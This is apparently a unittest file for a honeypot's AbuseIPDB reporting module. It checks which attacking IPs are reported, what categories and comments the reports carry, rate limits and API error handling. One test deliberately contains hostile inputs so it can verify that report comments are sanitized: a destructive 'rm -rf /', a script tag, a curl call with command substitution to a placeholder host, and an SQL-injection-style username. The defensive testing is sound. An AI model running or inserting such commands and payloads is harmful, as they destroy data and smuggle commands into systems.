"""dashboard/abuse.py: who gets reported, what a report contains, and how AbuseIPDB's answers are handled."""
import io
import json
import os
import sys
import tempfile
import unittest
import urllib.error
from urllib.parse import parse_qs

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "dashboard"))
import abuse  # noqa: E402

NOW = 1_800_000_000_000
H = 3600 * 1000


def s(ip, kind="ssh", stage=1, logins=5, end=NOW - H, **kw):
    return {"ip": ip, "kind": kind, "stage": stage, "logins": logins, "end": end, **kw}


class PlanTest(unittest.TestCase):
    def test_who_is_reported(self):
        sessions = [
            s("45.155.205.10"),                                   # SSH password guessing
            s("45.155.205.10", stage=3, logins=1),                # same IP later ran commands
            s("185.220.101.4", kind="telnet", stage=0),           # only connected: not reported
            s("91.92.240.17", kind="web", stage=1, logins=0),     # read a bait file
            s("179.43.140.3", kind="redis", stage=3, logins=0),   # changed data on a decoy
            s("162.142.125.9", kind="rdp", stage=1, logins=0),    # bare handshake: a scan, not reported
            s("8.8.4.4"),                                         # own IP
            s("10.0.0.15"),                                       # private
            s("1.1.1.1"),                                         # known benign
            s("94.26.88.30", end=NOW - 30 * H),                   # outside the window
        ]
        p = {r["ip"]: r for r in abuse.plan(sessions, own={"8.8.4.4"}, now_ms=NOW, benign={"1.1.1.1"})}
        self.assertEqual(set(p), {"45.155.205.10", "91.92.240.17", "179.43.140.3"})
        self.assertEqual(p["45.155.205.10"]["categories"], [abuse.HACKING, abuse.BRUTE_FORCE, abuse.SSH])
        self.assertEqual(p["45.155.205.10"]["sessions"], 2)
        self.assertEqual(p["45.155.205.10"]["comment"], "Honeypot: SSH login and shell commands (6 login attempts).")
        self.assertEqual(p["91.92.240.17"]["categories"], [abuse.BAD_WEB_BOT, abuse.WEB_APP_ATTACK])
        self.assertEqual(p["179.43.140.3"]["categories"], [abuse.PORT_SCAN, abuse.HACKING])

    def test_once_a_day_and_only_new_activity(self):
        sessions = [s("45.155.205.10", end=NOW - H)]
        self.assertEqual(abuse.plan(sessions, reported={"45.155.205.10": NOW - 2 * H}, now_ms=NOW), [])
        # reported 25 h ago and active since: reported again
        self.assertEqual(len(abuse.plan(sessions, reported={"45.155.205.10": NOW - 25 * H}, now_ms=NOW)), 1)
        # reported 25 h ago, but nothing happened since: nothing to say
        old = [s("45.155.205.10", end=NOW - 26 * H)]
        self.assertEqual(abuse.plan(old, reported={"45.155.205.10": NOW - 25 * H}, now_ms=NOW, window_ms=48 * H), [])

    def test_comment_never_carries_attacker_text(self):
        evil = s("45.155.205.10", stage=3, summary="rm -rf / ; Northbridge", client="SSH-2.0-<script>",
                 _events=[{"input": "curl http://x/$(id)"}], user="root'--")
        c = abuse.plan([evil], now_ms=NOW)[0]["comment"]
        for bad in ("rm -rf", "Northbridge", "script", "curl", "root"):
            self.assertNotIn(bad, c)
        self.assertTrue(c.startswith("Honeypot: "))


class FakeResp(io.BytesIO):
    status = 200

    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False


def http_error(code, detail=""):
    return urllib.error.HTTPError(abuse.API, code, "x", {}, io.BytesIO(json.dumps({"errors": [{"detail": detail}]}).encode()))


class RunTest(unittest.TestCase):
    def setUp(self):
        self.dir = tempfile.mkdtemp()
        self.path = os.path.join(self.dir, "abuse_reports.json")
        self.items = abuse.plan([s("45.155.205.10"), s("91.92.240.17", end=NOW - 2 * H)], now_ms=NOW)

    def tearDown(self):
        for f in os.listdir(self.dir):
            os.remove(os.path.join(self.dir, f))
        os.rmdir(self.dir)

    def test_sends_form_with_key_and_remembers(self):
        seen = []

        def opener(req, timeout):
            seen.append((req.full_url, req.get_header("Key"), parse_qs(req.data.decode())))
            return FakeResp(b'{"data": {}}')

        r = abuse.Reporter(self.path)
        self.assertEqual(r.run("k" * 20, self.items, opener)["sent"], 2)
        url, key, form = seen[0]
        self.assertEqual(url, "https://api.abuseipdb.com/api/v2/report")
        self.assertEqual(key, "k" * 20)
        self.assertEqual(form["ip"], ["45.155.205.10"])
        self.assertEqual(form["categories"], ["18,22"])
        self.assertEqual(set(form), {"ip", "categories", "comment", "timestamp"})
        again = abuse.Reporter(self.path)
        self.assertEqual(set(again.state["ips"]), {"45.155.205.10", "91.92.240.17"})
        self.assertEqual(again.state["total"], 2)

    def test_duplicate_counts_as_reported_and_bad_key_stops(self):
        calls = []

        def opener(req, timeout):
            calls.append(1)
            if len(calls) == 1:
                raise http_error(429, "You can only report the same IP address once in 15 minutes.")
            raise http_error(401, "Authentication failed")

        r = abuse.Reporter(self.path)
        out = r.run("k" * 20, self.items + self.items, opener)
        self.assertEqual(out["sent"], 0)
        self.assertEqual(len(calls), 2)  # stopped after the key was rejected
        self.assertIn("45.155.205.10", r.state["ips"])
        self.assertIn("rejected the key", r.status["error"])

    def test_no_key_and_daily_cap(self):
        r = abuse.Reporter(self.path)
        with self.assertRaises(ValueError):
            r.run("", self.items)
        r.left_today()
        r.state["today"] = abuse.DAILY_CAP
        self.assertEqual(r.run("k" * 20, self.items, lambda *a, **k: self.fail("sent past the cap"))["sent"], 0)


if __name__ == "__main__":
    unittest.main()
